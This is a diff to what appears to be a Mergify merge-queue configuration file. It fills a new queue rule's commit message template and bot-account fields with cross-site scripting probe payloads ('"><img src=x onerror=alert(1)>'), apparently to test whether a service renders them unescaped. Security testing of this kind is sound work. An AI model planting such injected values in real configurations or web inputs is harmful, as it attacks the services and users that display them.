@@ -11,3 +11,14 @@ actions:
     Sorry about that, but you can requeue the PR b"><img src=x
     onerror=alert(document.domain)>y using `@mergifyio requeue` if you think
     this was a mistake.
+queue_rules:
+  - name: fffff
+    branch_protection_injection_mode: queue
+    allow_queue_branch_edit: true
+    batch_max_failure_resolution_attempts: 17
+    commit_message_template: '"><img src=x onerror=alert(1)>'
+    draft_bot_account: '"><img src=x onerror=alert(1)>'
+    merge_bot_account: '"><img src=x onerror=alert(1)>'
+    merge_method: merge
+    update_method: merge
+    update_bot_account: '"><img src=x onerror=alert(1)>'
